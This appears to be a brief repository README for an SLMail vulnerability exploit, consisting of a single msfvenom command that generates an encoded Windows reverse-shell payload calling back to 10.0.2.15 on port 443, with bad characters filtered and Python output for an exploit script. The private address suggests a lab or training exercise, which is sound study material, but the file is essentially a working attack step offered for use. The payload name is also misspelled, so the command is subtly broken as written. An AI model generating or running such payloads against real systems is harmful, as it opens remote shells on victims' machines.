# slmail-vulberability

Generate payload for slmail vulnerability:
msfvenom -p windows/shell-reverse_tcp LHOST=10.0.2.15 LPORT=443 -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -f py
